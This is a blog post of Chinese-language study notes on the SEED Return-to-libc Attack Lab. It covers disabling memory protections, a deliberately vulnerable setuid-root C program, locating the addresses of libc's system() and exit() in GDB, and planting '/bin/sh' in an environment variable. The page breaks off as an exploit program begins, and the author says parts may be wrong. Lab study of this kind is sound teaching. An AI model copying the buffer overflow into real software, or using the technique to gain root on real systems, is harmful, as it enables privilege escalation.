<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Return-to-libc Attack Lab | SmacUL&#39;s Blog</title>
    <meta name="description" content="你好">
    <link rel="icon" href="/assets/img/Logo.png">
    
    <link rel="preload" href="/assets/css/0.styles.e8ff0ee6.css" as="style"><link rel="preload" href="/assets/js/app.27d58fa7.js" as="script"><link rel="preload" href="/assets/js/2.f1f09924.js" as="script"><link rel="preload" href="/assets/js/43.91bf82a7.js" as="script"><link rel="prefetch" href="/assets/js/10.da04177b.js"><link rel="prefetch" href="/assets/js/11.33537db2.js"><link rel="prefetch" href="/assets/js/12.2c196981.js"><link rel="prefetch" href="/assets/js/13.501a5542.js"><link rel="prefetch" href="/assets/js/14.93a9b12d.js"><link rel="prefetch" href="/assets/js/15.7ddd6566.js"><link rel="prefetch" href="/assets/js/16.32ee58e2.js"><link rel="prefetch" href="/assets/js/17.c415498a.js"><link rel="prefetch" href="/assets/js/18.5ef64d19.js"><link rel="prefetch" href="/assets/js/19.521006c9.js"><link rel="prefetch" href="/assets/js/20.1aa33ed7.js"><link rel="prefetch" href="/assets/js/21.82b9d691.js"><link rel="prefetch" href="/assets/js/22.793f9d85.js"><link rel="prefetch" href="/assets/js/23.0ca70d66.js"><link rel="prefetch" href="/assets/js/24.d86f1591.js"><link rel="prefetch" href="/assets/js/25.2ce3a84b.js"><link rel="prefetch" href="/assets/js/26.12cdc3ac.js"><link rel="prefetch" href="/assets/js/27.7b341d36.js"><link rel="prefetch" href="/assets/js/28.61c57439.js"><link rel="prefetch" href="/assets/js/29.90d6873f.js"><link rel="prefetch" href="/assets/js/3.7db0d588.js"><link rel="prefetch" href="/assets/js/30.4f5e13f5.js"><link rel="prefetch" href="/assets/js/31.7ec86adf.js"><link rel="prefetch" href="/assets/js/32.0c179479.js"><link rel="prefetch" href="/assets/js/33.b68ce17c.js"><link rel="prefetch" href="/assets/js/34.6d314a9c.js"><link rel="prefetch" href="/assets/js/35.15ecee78.js"><link rel="prefetch" href="/assets/js/36.d6998519.js"><link rel="prefetch" href="/assets/js/37.e84aeb89.js"><link rel="prefetch" href="/assets/js/38.8bd5bba9.js"><link rel="prefetch" href="/assets/js/39.ffd3bce6.js"><link rel="prefetch" href="/assets/js/4.9b31f553.js"><link rel="prefetch" href="/assets/js/40.1b57eaa8.js"><link rel="prefetch" href="/assets/js/41.ac6f9062.js"><link rel="prefetch" href="/assets/js/42.8854bf5a.js"><link rel="prefetch" href="/assets/js/44.c35012af.js"><link rel="prefetch" href="/assets/js/45.07b8e581.js"><link rel="prefetch" href="/assets/js/46.02916103.js"><link rel="prefetch" href="/assets/js/47.f1be0d43.js"><link rel="prefetch" href="/assets/js/48.7f7c7f55.js"><link rel="prefetch" href="/assets/js/49.6692487b.js"><link rel="prefetch" href="/assets/js/5.23b29502.js"><link rel="prefetch" href="/assets/js/50.6c2f6d29.js"><link rel="prefetch" href="/assets/js/51.f7be7c31.js"><link rel="prefetch" href="/assets/js/52.b9dad83f.js"><link rel="prefetch" href="/assets/js/53.8f778f89.js"><link rel="prefetch" href="/assets/js/54.9853cbd5.js"><link rel="prefetch" href="/assets/js/55.f1dfad52.js"><link rel="prefetch" href="/assets/js/56.a89162ce.js"><link rel="prefetch" href="/assets/js/57.b1f1111f.js"><link rel="prefetch" href="/assets/js/58.08f753ab.js"><link rel="prefetch" href="/assets/js/59.e2ff4e09.js"><link rel="prefetch" href="/assets/js/6.ca86ed4c.js"><link rel="prefetch" href="/assets/js/60.14c1ce69.js"><link rel="prefetch" href="/assets/js/61.06a9c523.js"><link rel="prefetch" href="/assets/js/62.af6d0bf2.js"><link rel="prefetch" href="/assets/js/63.47139735.js"><link rel="prefetch" href="/assets/js/64.1b3689b6.js"><link rel="prefetch" href="/assets/js/65.c599d8e8.js"><link rel="prefetch" href="/assets/js/66.91648506.js"><link rel="prefetch" href="/assets/js/67.ecf7742c.js"><link rel="prefetch" href="/assets/js/68.b8769d15.js"><link rel="prefetch" href="/assets/js/69.e055ff05.js"><link rel="prefetch" href="/assets/js/7.9d170f74.js"><link rel="prefetch" href="/assets/js/70.065d9e72.js"><link rel="prefetch" href="/assets/js/71.840612b5.js"><link rel="prefetch" href="/assets/js/72.2a605e0c.js"><link rel="prefetch" href="/assets/js/73.3e54fae5.js"><link rel="prefetch" href="/assets/js/74.8e626e7b.js"><link rel="prefetch" href="/assets/js/75.c64b57c0.js"><link rel="prefetch" href="/assets/js/76.0e7007be.js"><link rel="prefetch" href="/assets/js/77.c8b770b0.js"><link rel="prefetch" href="/assets/js/78.d7da3c62.js"><link rel="prefetch" href="/assets/js/79.a78c6d63.js"><link rel="prefetch" href="/assets/js/8.3616387d.js"><link rel="prefetch" href="/assets/js/80.dda2cb25.js"><link rel="prefetch" href="/assets/js/81.2f232306.js"><link rel="prefetch" href="/assets/js/82.df6bca63.js"><link rel="prefetch" href="/assets/js/83.6251af59.js"><link rel="prefetch" href="/assets/js/84.d3eda27f.js"><link rel="prefetch" href="/assets/js/85.71180abd.js"><link rel="prefetch" href="/assets/js/86.3c5a5f86.js"><link rel="prefetch" href="/assets/js/87.12474af5.js"><link rel="prefetch" href="/assets/js/9.c04fa05e.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8ff0ee6.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">SmacUL's Blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">主页</a></div><div class="nav-item"><a href="/self/" class="nav-link">关于我</a></div><div class="nav-item"><a href="https://github.com/SmacUL" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">主页</a></div><div class="nav-item"><a href="/self/" class="nav-link">关于我</a></div><div class="nav-item"><a href="https://github.com/SmacUL" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/log/seed_labs/" class="sidebar-link">Seed Labs</a></li><li><a href="/log/seed_labs/Cross-Site Scripting Attack.html" class="sidebar-link">Cross-Site Scripting Attack</a></li><li><a href="/log/seed_labs/SQL Injection Attack Lab.html" class="sidebar-link">SQL Injection Attack Lab</a></li><li><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html" class="sidebar-link">Buffer-Overflow Vulnerability Lab</a></li><li><a href="/log/seed_labs/Packet Sniffing and Spoofing Lab.html" class="sidebar-link">Packet Sniffing and Spoofing Lab</a></li><li><a href="/log/seed_labs/Public-Key Infrastructure Lab.html" class="sidebar-link">Public-Key Infrastructure Lab</a></li><li><a href="/log/seed_labs/Local DNS Attack Lab.html" class="sidebar-link">Local DNS Attack Lab</a></li><li><a href="/log/seed_labs/Remote DNS Cache Poisoning Attack Lab.html" class="sidebar-link">Remote DNS Cache Poisoning Attack Lab</a></li><li><a href="/log/seed_labs/Android Repackaging Attack Lab.html" class="sidebar-link">Android Repackaging Attack Lab</a></li><li><a href="/log/seed_labs/Return-to-libc Attack Lab.html" class="active sidebar-link">Return-to-libc Attack Lab</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#pre-experiment" class="sidebar-link">Pre-Experiment</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#turning-off-countermeasures" class="sidebar-link">Turning off countermeasures</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#address-space-randomization" class="sidebar-link">Address Space Randomization</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#the-stackguard-protection-scheme" class="sidebar-link">The StackGuard Protection Scheme</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#non-executable-stack" class="sidebar-link">Non-Executable Stack</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#configuring-bin-sh-ubuntu-16-04-vm-only" class="sidebar-link">Configuring /bin/sh (Ubuntu 16.04 VM only)</a></li></ul></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#the-vulnerable-program" class="sidebar-link">The Vulnerable Program</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#t1-finding-out-the-addresses-of-libc-functions" class="sidebar-link">T1 Finding out the addresses of libc functions</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#t2-putting-the-shell-string-in-the-memory" class="sidebar-link">T2 Putting the shell string in the memory</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#t3-exploiting-the-buffer-overflow-vulnerability" class="sidebar-link">T3 Exploiting the buffer-overflow vulnerability</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#一个可能的答案" class="sidebar-link">一个可能的答案</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#我又回来了" class="sidebar-link">我又回来了</a></li></ul></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#t4-turning-on-address-randomization" class="sidebar-link">T4 Turning on address randomization</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#t5-defeat-shell’s-countermeasure" class="sidebar-link">T5 Defeat Shell’s countermeasure</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Return-to-libc Attack Lab.html#t6-defeat-shell’s-countermeasure-without-putting-zeros-in-input" class="sidebar-link">T6 Defeat Shell’s countermeasure without putting zeros in input</a></li></ul></li><li><a href="/log/seed_labs/Virtual Private Network Lab.html" class="sidebar-link">Virtual Private Network Lab</a></li><li><a href="/log/seed_labs/Heartbleed Attack Lab.html" class="sidebar-link">Heartbleed Attack Lab</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="return-to-libc-attack-lab"><a href="#return-to-libc-attack-lab" class="header-anchor">#</a> Return-to-libc Attack Lab</h1> <h2 id="pre-experiment"><a href="#pre-experiment" class="header-anchor">#</a> Pre-Experiment</h2> <p>Day one 中有一个实验, <em>Buffer-Overflow Vulnerability lab</em> 应该是和这个实验承接的, 都属于缓冲区溢出攻击. 之前的实验主要利用了可运行栈来展开攻击, 这个实验的主题就是 <em>Return-to-libc attack</em>, 一个新的方向.</p> <div class="custom-block warning"><p class="custom-block-title">有问题</p> <p>后面有一些实验内容, 因为水平有限没有完成. 一些内容的描述存在错误. 仅做参考.</p></div> <ul><li>汇编基础<br> <a href="http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html" target="_blank" rel="noopener noreferrer">阮一峰-汇编语言入门教程<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li>shellcode<br> <a href="http://blog.nsfocus.net/easy-implement-shellcode-xiangjie/" target="_blank" rel="noopener noreferrer">绿盟科技博客-手把手简易实现shellcode及详解<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li> <li>实验指导里的 Guidelines</li></ul> <h2 id="turning-off-countermeasures"><a href="#turning-off-countermeasures" class="header-anchor">#</a> Turning off countermeasures</h2> <p>关闭相关防御措施.</p> <h3 id="address-space-randomization"><a href="#address-space-randomization" class="header-anchor">#</a> Address Space Randomization</h3> <p>系统自带的地址空间随机化的机制.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">0</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="the-stackguard-protection-scheme"><a href="#the-stackguard-protection-scheme" class="header-anchor">#</a> The StackGuard Protection Scheme</h3> <p>编译 C 文件的时候让 GCC 关闭栈保护</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gcc -fno-stack-protector example.c
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="non-executable-stack"><a href="#non-executable-stack" class="header-anchor">#</a> Non-Executable Stack</h3> <p>不可执行栈.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gcc -z execstack -o <span class="token builtin class-name">test</span> test.c
gcc -z noexecstack -o <span class="token builtin class-name">test</span> test.c
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><a href="https://blog.csdn.net/zither/article/details/443603" target="_blank" rel="noopener noreferrer">参考<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h3 id="configuring-bin-sh-ubuntu-16-04-vm-only"><a href="#configuring-bin-sh-ubuntu-16-04-vm-only" class="header-anchor">#</a> Configuring /bin/sh (Ubuntu 16.04 VM only)</h3> <p>Ubuntu 16.04 会阻止 Set-UID 应用程序, Set-UID 是啥</p> <p><code>/bin/bash</code> 连接的是 <code>/bin/dash</code>, 我们希望连接到 <code>/bin/zsh</code>, 防止我们在攻击时失去相关的权限?</p> <p>Ubuntu Shell 都有哪些</p> <h2 id="the-vulnerable-program"><a href="#the-vulnerable-program" class="header-anchor">#</a> The Vulnerable Program</h2> <p>这里给出一个存在隐患的程序 retlib.c . 之间创建在共享文件夹中吧, 方便两头修改.</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span> </span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span> </span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token macro property">#<span class="token directive keyword">ifndef</span> BUF_SIZE </span>
<span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 12</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

<span class="token comment">/**
 * 创造溢出, buffer 数组长度只有 12, fread 方法直接从 badfile 中读了 300 的数据到 buffer 中. 
 */</span>
<span class="token keyword">int</span> bof <span class="token punctuation">(</span>FILE <span class="token operator">*</span>badfile<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">int</span> main <span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>
    <span class="token keyword">char</span> dummy<span class="token punctuation">[</span>BUF_SIZE<span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token comment">// 将 dummy 中所有的元素全部设为 0</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>dummy<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> BUF_SIZE<span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">&quot;badfile&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">bof</span><span class="token punctuation">(</span>badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Returned Properly\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>这一段程序创建了一个 5 倍 BUF_SIZE 长度的数组, 并赋值所有元素为 0, 然后打开 badfile 文件. <code>bof</code> 方法中创建一个长度为 BUF_SIZE 的缓冲区数组, 并向其写入 300 长度的 badfile 文件中的数据, 创造溢出.</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>gcc -DBUF_SIZE<span class="token operator">=</span><span class="token number">12</span> -fno-stack-protector -z noexecstack -o retlib retlib.c 
<span class="token function">sudo</span> <span class="token function">chown</span> root retlib
<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">4755</span> retlib
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>按照要求 1 行中 <code>-DBUF_SIZE</code> 值应该为代码中 <code>BUF_SIZE</code> 的值. 具体可以参考 <em>For instructors</em> 中的内容</p> <p>也有同志提出了另一种方式, 直接在 root 环境编译, 存疑.</p> <div class="custom-block warning"><p class="custom-block-title">retlib.c 中 dummy 数组的作用是什么</p> <p>?</p></div> <h2 id="t1-finding-out-the-addresses-of-libc-functions"><a href="#t1-finding-out-the-addresses-of-libc-functions" class="header-anchor">#</a> T1 Finding out the addresses of libc functions</h2> <p>在关闭随机内存地址的保护机制后, 找出 libc 库 中方法在内存中的地址.
利用 GDB 工具可以找到 <code>system</code> 与 <code>exit</code> 方法.</p> <p>GDB: GUN Project Debuger <a href="https://blog.csdn.net/haoel/article/details/2879" target="_blank" rel="noopener noreferrer">参考<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gdb -q retlib
run
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">..</span>. <span class="token punctuation">..</span>.
p system
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">&gt;</span><span class="token punctuation">}</span> 0xb7da4da0 <span class="token operator">&lt;</span>__libc_system<span class="token operator">&gt;</span>
p <span class="token builtin class-name">exit</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token variable">$2</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">&gt;</span><span class="token punctuation">}</span> 0xb7d989d0 <span class="token operator">&lt;</span>__GI_exit<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>更换文件, 修改文件的用户所有, 切换 shell, 都会导致地址出现变化.</p> <h2 id="t2-putting-the-shell-string-in-the-memory"><a href="#t2-putting-the-shell-string-in-the-memory" class="header-anchor">#</a> T2 Putting the shell string in the memory</h2> <p>shell 是用户与系统之间交互的界面, 它是程序, 系统工作时就是一个进程.</p> <p>shell 在接受用户的任务之后, 会先 fork 一个子进程, 并将所有 exported shell 变量放入到子进程的环境变量中, 让子进程能够访问这些变量. 那么攻击的方法就是在这些变量中插入一些不该有的东西.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token builtin class-name">export</span> <span class="token assign-left variable">MYSHELL</span><span class="token operator">=</span>/bin/sh 
<span class="token function">env</span> <span class="token operator">|</span> <span class="token function">grep</span> MYSHELL 
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token assign-left variable">MYSHELL</span><span class="token operator">=</span>/bin/sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>export 指令
env 指令
grep 指令</p> <p>可以创建一个 task2.c 的文件, 并写入</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span><span class="token operator">*</span> shell <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">&quot;MYSHELL&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%x\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>shell<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gcc -o task2 task2.c <span class="token operator">&amp;&amp;</span> ./task2
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> bffffdf1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>如果再创建一个 task2-1.c 内容和 task2.c 一致</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gcc -o task2-1 task2-1.c <span class="token operator">&amp;&amp;</span> ./task2-1
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> bffffded
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>同一个 shell 变量的地址在不同程序中打印出的结果不一致, 但很接近.</p> <h2 id="t3-exploiting-the-buffer-overflow-vulnerability"><a href="#t3-exploiting-the-buffer-overflow-vulnerability" class="header-anchor">#</a> T3 Exploiting the buffer-overflow vulnerability</h2> <p>当前用户已经能够使用 sudo 权限, 但是无法进入到 root 环境中.</p> <p>在之前编译 retlib.c 之后, 将文件所有者改为 root, 同时修改文件的读写权限.</p> <p>sudo 指令应该是在自己的用户环境下使用 root 权限; 如果直接使用 su, 则进入到 root 环境下.</p> <p>实验指导中给出了: <code>exit()</code> <code>system()</code> <code>/bin/sh</code> 三个东西,  <code>/bin/sh</code> 需要作为参数传入到 <code>system()</code> 方法中, 且 <code>/bin/sh</code> 存放在 <code>MYSELL</code> 变量中</p> <div class="custom-block warning"><p class="custom-block-title">`exit()` 方法的作用是什么?</p> <p>它和 <code>system()</code> 方法之间的关系?</p></div> <p>首先可以确定两个方法与 <code>MYSHELL</code> 变量的地址.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>0xbffffe03  <span class="token comment"># &quot;/bin/sh&quot; </span>
0xb7e42da0  <span class="token comment"># system()  </span>
0xb7e369d0  <span class="token comment"># exit() </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>或</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>0xbffffdef  <span class="token comment"># &quot;/bin/sh&quot; </span>
0xb7da4da0  <span class="token comment"># system()  </span>
0xb7d989d0  <span class="token comment"># exit() </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>那么主要的问题是如何确定 X Y Z ?</p> <p>先创建一个 badfile, 写入键盘顺序的 <code>1-0</code>, <code>q-p</code>, <code>a-;</code>, <code>z-/</code>, 总共四行 40 个字符. 之后在 gdb 中运行 retlib, 中间 code 部分会提示在 0x62206863 的位置存在问题, 对应的字符为 <code>ghjk</code>, 那么有 24 个字符被正常读取, 从第 24 开始 (0 计数) 出现了问题.</p> <div class="custom-block warning"><p class="custom-block-title">BUF_SIZE 的大小为 12, 和这里的 24 有什么关系</p> <p>?</p></div> <div class="custom-block warning"><p class="custom-block-title">如何选择 X Y Z</p> <p>那么 X Y Z 是不是应该为 24 28 32 这三个数字的组合? 没人谈谈这个三个数字的故事么.</p></div> <h3 id="一个可能的答案"><a href="#一个可能的答案" class="header-anchor">#</a> 一个可能的答案</h3> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
